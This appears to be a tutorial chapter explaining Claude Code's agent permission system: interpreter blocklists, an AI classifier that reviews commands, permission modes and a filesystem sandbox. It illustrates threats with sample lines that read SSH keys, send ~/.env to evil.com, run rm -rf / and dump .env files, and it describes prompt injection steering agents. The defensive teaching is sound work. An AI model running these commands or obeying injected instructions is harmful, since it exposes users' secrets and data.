[中文](/docs/12-从Claude Code权限系统学Agent安全设计.md)

# 12 Learning Agent Security Design from Claude Code's Permission System

## Security Is the Most Overlooked Issue in the Agent Era

When most teams build Agents, their priority list looks like this: first, get the Agent working — able to call tools, write files, execute commands — then ship it. Security? We'll deal with that later.

The Claude Code source code leak gave us a rare opportunity to see just how much a top-tier Agent company invests in security.

The answer: **6,300 lines of code, 25 files, the heaviest single module in the entire codebase.** Heavier than the Agent loop, heavier than message compression, heavier than MCP integration.

Anthropic voted with lines of code: **Constraining what an Agent must not do is more important than enabling what an Agent can do.**

## 1️⃣ How Agent Security Differs from Traditional Software Security

Traditional software security is built on a fundamental assumption: program behavior is deterministic. Whatever code you write, that's what it executes. Security auditing means checking code logic for vulnerabilities.

Agents completely shatter this assumption.

Agent behavior is **probabilistic**. Given the same user input, the model might choose to read a file, execute a command, or search first before deciding. You can't use static analysis to cover all possible execution paths, because execution paths are dynamically determined by the model at runtime.

What's worse is **prompt injection**. Malicious input can be injected into an Agent's context through various channels: direct user input, file contents being read, scraped web pages, data returned by third-party MCP tools. Once the model is injected with malicious instructions, it might read your SSH keys, delete your code, or send data to an external server.

This means Agent security can't be guaranteed by code review alone. **You must intercept at runtime.**

Claude Code's approach was to build a three-layer defense system.

## 2️⃣ First Line of Defense: 42 Hardcoded Rules

The code has 42 hardcoded auto-deny bash patterns. Regardless of user configuration or permission mode, the Agent can never execute these commands.

**Cross-platform code execution — 16 rules:**

python, node, deno, tsx, ruby, perl, php, lua, npx, bunx, npm run, yarn run, pnpm run, bun run, bash, sh

**Unix-specific — 5 rules:**

zsh, fish, eval, exec, env/xargs/sudo

**Anthropic internal — 8 rules:**

curl, wget, git, kubectl, aws, gcloud, gsutil, etc.

**The core logic boils down to one principle: block every command that can launch an interpreter.**

Why? Here's a concrete example. Suppose the Agent is allowed to execute the `python` command. Once inside the Python interpreter, it can execute any code:

```python
import os
os.system("cat ~/.ssh/id_rsa")  # Read your SSH private key
os.system("curl -X POST evil.com -d @~/.env")  # Exfiltrate env vars to an external server
os.system("rm -rf /")  # Delete all files
```

The filesystem sandbox, command whitelist, and path validation you built at the outer layer all become useless once inside the Python interpreter. Because an interpreter is a complete runtime environment that can bypass all outer constraints.

**This is why Claude Code chose the most aggressive strategy: outright ban all interpreter launches.** Better to over-block than to under-block.

Industry comparison: Most open-source Agent frameworks invest basically zero in this layer. LangChain's Agent can execute any bash command without restriction. AutoGen similarly has no built-in command interception. The gap is orders of magnitude.

## 3️⃣ Second Line of Defense: ML Classifier for Intelligent Judgment

Hardcoded rules handle known dangerous patterns. But what about commands that aren't on the blocklist but could still be risky?

For example, `find . -name "*.env" -exec cat {} \;`. This command isn't in the 42 rules, but it traverses all environment variable files and outputs their contents — a high security risk. Regex matching struggles to identify this kind of semantic-level risk.

Claude Code introduced the **YOLO classifier**. This classifier makes a side-query call to the Claude model itself, passing in the current bash command, working directory, and environment information, and asks the model to judge whether the command is safe.

```
Input: find . -name "*.env" -exec cat {} \;
Output: {
  matches: true,
  confidence: "high",
  reason: "Traverses and outputs all .env files, potentially leaking sensitive environment variables"
}
```

**Using AI to constrain AI.** The model's understanding of bash semantics far surpasses any regex matching. It can understand the combined semantics of commands, the final effect of pipe chains, and the implicit meaning of arguments.

Of course, this layer has costs. Every tool call requires an additional API request. So Claude Code only enables the classifier in auto mode, and requires Opus 4.6 or above — lower-end models don't have sufficient judgment accuracy.

## 4️⃣ Third Line of Defense: Manual User Confirmation

The most traditional and most reliable layer. When the Agent wants to execute a tool, a prompt pops up showing the tool name, parameters, and scope of impact. The user clicks Allow or Deny.

Claude Code offers three permission modes for users to choose from:

| Mode | Best For | How It Works |
|------|----------|--------------|
| **default** | Beginners, sensitive operations | Every tool call requires confirmation |
| **auto** | Daily development, experienced users | ML classifier auto-judges; only uncertain calls prompt |
| **plan** | Long-running tasks | Model outputs a full plan with confidence per step; only low-confidence steps require confirmation |

The three modes cover the full spectrum from maximum safety to maximum efficiency. Users can flexibly switch based on the risk level of their current task.

## 5️⃣ An Easily Overlooked Design: Dangerous Rule Stripping

In default mode, users might configure some allow rules to avoid frequent pop-ups. For example, `Bash(python*)` means auto-approve all python commands.

In default mode, this is fine — even if a rule auto-approves, the user still sees the pop-up and can make a human judgment.

But if the user switches to auto mode, this rule becomes a security vulnerability. The classifier will directly approve all python commands per the allow rule, with no pop-up.

Claude Code's solution: **When entering auto mode, automatically strip all allow rules that involve dangerous patterns.** The python rule you approved in default mode automatically becomes invalid when you switch to auto mode.

**Security policies cannot simply be inherited across different permission levels.** This design principle is worth remembering for every team building permission systems.

## 6️⃣ Filesystem Sandbox

Beyond command-level interception, there are file-level constraints.

The Agent's file operations are restricted to the working directory and its subdirectories. Specific restrictions:

- `..` path traversal is forbidden, preventing reads of system files via paths like `../../etc/passwd`
- Write access to the `.git` directory is forbidden, preventing modification of git history
- Write access to the `.claude` directory is forbidden, preventing tampering with permission configurations
- Additional working directories can be added via configuration

This layer blocks attacks implemented through file operations via prompt injection. For example, if malicious web content is read by the Agent and injects an instruction to modify `~/.bashrc` to plant a backdoor, the sandbox intercepts it directly because `~/.bashrc` is not within the working directory.

## 7️⃣ If You're Building an Agent, Do at Least These Things

**Minimum bar: Hardcode a dangerous command blocklist.** You don't need as many as 42, but python, node, bash, eval, and rm -rf must be blocked. It takes 30 minutes and covers 80% of security risks.

**Next level: Add a filesystem sandbox.** Restrict the Agent's file operations to the working directory, forbid path traversal. For enterprise Agents, this is mandatory.

**Further: Tiered permissions.** Different operations get different confirmation levels. File reads can be auto-approved, file writes need confirmation, command execution needs strict review.

**Final form: Use AI to review AI.** Introduce an independent security classification Agent that performs risk assessment on every tool call.

| Level | What to Do | Cost | Coverage |
|-------|-----------|------|----------|
| L1 | Dangerous command blocklist | 30 minutes | 80% |
| L2 | + Filesystem sandbox | 1-2 days | 90% |
| L3 | + Tiered permission modes | 3-5 days | 95% |
| L4 | + ML security classifier | 1-2 weeks | 99% |

Claude Code achieved L4. Most open-source Agents are still at L0.

**Model capability determines what an Agent can do. The permission system determines what an Agent must not do. The latter is more important than the former.**

## Next

[13 - Source Code Findings and Ban Mechanism](/docs/13-啃完51万行源码的发现与Claude的封号机制.md)
